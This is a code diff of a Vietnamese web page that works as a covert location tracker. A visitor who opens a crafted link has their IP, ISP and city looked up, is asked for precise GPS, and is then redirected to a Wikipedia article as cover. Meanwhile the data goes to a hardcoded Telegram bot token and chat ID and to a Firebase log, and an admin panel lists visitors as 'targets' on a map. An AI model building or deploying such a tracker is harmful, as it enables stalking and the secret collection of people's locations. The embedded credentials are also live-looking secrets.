@@ -29,15 +29,9 @@
                     <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 shadow-2xl">
                         <h3 class="text-blue-500 font-bold text-[10px] uppercase mb-4 tracking-widest italic">Cấu hình nhanh</h3>
                         <div class="space-y-3">
-                            <div>
-                                <label class="text-[9px] uppercase ml-2">Telegram Token</label>
-                                <input id="in-tk" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none focus:border-blue-500">
-                            </div>
-                            <div>
-                                <label class="text-[9px] uppercase ml-2">Chat ID</label>
-                                <input id="in-id" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none focus:border-blue-500">
-                            </div>
-                            <button onclick="saveC()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-xs transition-all">LƯU THAY ĐỔI</button>
+                            <input id="in-tk" type="text" placeholder="Bot Token" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
+                            <input id="in-id" type="text" placeholder="Chat ID" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
+                            <button onclick="saveC()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-xs transition-all">LƯU CẤU HÌNH</button>
                         </div>
                     </div>
                     
@@ -53,7 +47,7 @@
                     <div class="bg-[#161b22] rounded-3xl border border-slate-800 overflow-hidden shadow-2xl">
                         <table class="w-full text-left text-[11px]">
                             <thead class="bg-slate-900 text-slate-500 uppercase text-[9px]">
-                                <tr><th class="p-4">Mục tiêu</th><th class="p-4">IP / Nhà mạng</th><th class="p-4 text-right">Vị trí</th></tr>
+                                <tr><th class="p-4">Mục tiêu</th><th class="p-4">IP / ISP</th><th class="p-4 text-right">Trạng thái</th></tr>
                             </thead>
                             <tbody id="t-logs" class="divide-y divide-slate-800"></tbody>
                         </table>
@@ -64,59 +58,56 @@
     </div>
 
     <script>
-        // ========================================================
-        // 1. SỬA LINK FIREBASE TẠI ĐÂY
-        // ========================================================
-        const firebaseConfig = { 
-            databaseURL: "https://9000-firebase-check2-1770334468923.cluster-mwsteha33jfdowtvzffztbjcj6.cloudworkstations.dev" 
-        };
-        // ========================================================
-
+        // === SỬA LINK FIREBASE CỦA BẠN TẠI ĐÂY ===
+        const firebaseConfig = { databaseURL: "https://9000-firebase-check2-1770334468923.cluster-mwsteha33jfdowtvzffztbjcj6.cloudworkstations.dev" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // Cấu hình mặc định (Sẽ bị ghi đè nếu bạn sửa trong Admin)
-        let cfg = { 
-            t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144", 
-            i: "5887642221", 
-            r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân" 
-        };
-
+        let cfg = { t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144", i: "5887642221", r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân" };
         const params = new URLSearchParams(window.location.search);
         let map, markers = [];
 
         window.onload = async () => {
             if (params.has('admin')) {
-                const auth = localStorage.getItem('sentinel_auth');
-                if (auth === 'true' || prompt("Nhập Pass:") === "123") {
+                if (localStorage.getItem('sentinel_auth') === 'true' || prompt("Nhập Pass:") === "123") {
                     localStorage.setItem('sentinel_auth', 'true');
                     document.getElementById('v-track').classList.add('hidden');
                     document.getElementById('v-admin').classList.remove('hidden');
                     initAdmin();
                 } else { window.location.search = ""; }
-            } else {
-                startTrack();
-            }
+            } else { startTrack(); }
         };
+
+        // Hàm lấy IP ổn định hơn
+        async function getIP() {
+            try {
+                // Thử dịch vụ 1
+                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
+                if (res.ip) return res;
+            } catch (e) {
+                // Dự phòng dịch vụ 2 nếu cái 1 lỗi
+                return fetch('https://extreme-ip-lookup.com/json/').then(r => r.json()).catch(() => ({}));
+            }
+        }
 
         async function startTrack() {
             const v = params.get('v');
             try { if(v) cfg = JSON.parse(atob(v)); } catch(e) {}
 
-            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const ipRes = await getIP();
             const logData = {
-                name: params.get('name') || 'Mục tiêu mới',
-                ip: ipRes.ip || '?',
-                isp: ipRes.org || '?',
-                loc: `${ipRes.city || '?'}, ${ipRes.country || '?'}`,
+                name: params.get('name') || 'Ẩn danh',
+                ip: ipRes.ip || ipRes.query || 'Chặn IP',
+                isp: ipRes.org || ipRes.businessName || 'Không rõ',
+                loc: (ipRes.city && ipRes.country) ? `${ipRes.city}, ${ipRes.country}` : 'Không rõ',
                 time: new Date().toLocaleString(),
-                lat: ipRes.latitude || null,
-                lon: ipRes.longitude || null,
-                st: 'IP-ONLY'
+                lat: ipRes.latitude || ipRes.lat || null,
+                lon: ipRes.longitude || ipRes.lon || null,
+                st: 'IP-Captured'
             };
 
             const report = (m) => fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(m)}`);
-            await report(`🚀 <b>TRUY CẬP: ${logData.name}</b>\n🌐 IP: <code>${logData.ip}</code>\n📍 Vùng: ${logData.loc}`);
+            await report(`🚀 <b>TRUY CẬP: ${logData.name}</b>\n🌐 IP: <code>${logData.ip}</code>\n🏢 ISP: ${logData.isp}\n📍 Vùng: ${logData.loc}`);
 
             const logRef = db.ref('logs').push(logData);
 
@@ -124,14 +115,14 @@
                 navigator.geolocation.getCurrentPosition(async (p) => {
                     const lat = p.coords.latitude, lon = p.coords.longitude;
                     await logRef.update({ lat, lon, st: 'GPS-OK' });
-                    await report(`🎯 <b>GPS OK: ${logData.name}</b>\n📍 <a href="http://maps.google.com/q=$${lat},${lon}">XEM BẢN ĐỒ</a>`);
+                    await report(`🎯 <b>GPS OK: ${logData.name}</b>\n📍 <a href="http://maps.google.com/q=$$${lat},${lon}">XEM BẢN ĐỒ</a>`);
                     location.replace(cfg.r);
                 }, async () => {
-                    await report(`⚠️ <b>TỪ CHỐI GPS: ${logData.name}</b>\n📍 Vị trí IP dự phòng.`);
+                    await report(`⚠️ <b>TỪ CHỐI GPS: ${logData.name}</b>\n📍 Chỉ lấy được IP.`);
                     location.replace(cfg.r);
-                }, {enableHighAccuracy:true, timeout:5000});
+                }, {enableHighAccuracy:true, timeout:6000});
             } else { location.replace(cfg.r); }
-            setTimeout(() => location.replace(cfg.r), 7000);
+            setTimeout(() => location.replace(cfg.r), 8000);
         }
 
         function initAdmin() {
@@ -155,12 +146,12 @@
                         markers.push(m);
                     }
                     table.innerHTML = `
-                        <tr class="hover:bg-slate-800/40">
-                            <td class="p-4"><b class="text-white">${item.name}</b><br><span class="text-[9px] text-slate-500">${item.time}</span></td>
-                            <td class="p-4"><span class="text-blue-400">${item.ip}</span><br><span class="text-[9px]">${item.isp}</span></td>
+                        <tr class="hover:bg-slate-800/40 border-b border-slate-800">
+                            <td class="p-4 font-bold text-white">${item.name}<br><span class="text-[9px] font-normal text-slate-500">${item.time}</span></td>
+                            <td class="p-4 text-blue-400 font-mono text-[10px]">${item.ip}<br><span class="text-slate-500 text-[9px] uppercase">${item.isp}</span></td>
                             <td class="p-4 text-right">
-                                <span class="text-[10px] ${item.st==='GPS-OK'?'text-green-500':'text-red-500'} font-bold">${item.st}</span><br>
-                                <button onclick="map.flyTo([${item.lat},${item.lon}], 16)" class="text-blue-500 text-[10px] underline">Map</button>
+                                <span class="${item.st==='GPS-OK'?'text-green-500':'text-yellow-600'} font-bold uppercase text-[9px]">${item.st}</span><br>
+                                <button onclick="map.flyTo([${item.lat},${item.lon}], 16)" class="text-blue-500 text-[10px] underline">Ghim</button>
                             </td>
                         </tr>` + table.innerHTML;
                 }
@@ -171,12 +162,12 @@
             cfg.t = document.getElementById('in-tk').value;
             cfg.i = document.getElementById('in-id').value;
             localStorage.setItem('cfg_v12', JSON.stringify(cfg));
-            alert("Đã lưu!");
+            alert("Đã lưu cấu hình thành công!");
         }
 
         function copyL() {
             navigator.clipboard.writeText(document.getElementById('out-link').innerText);
-            alert("Đã copy!");
+            alert("Đã copy link!");
         }
 
         document.getElementById('in-name').oninput = function() {
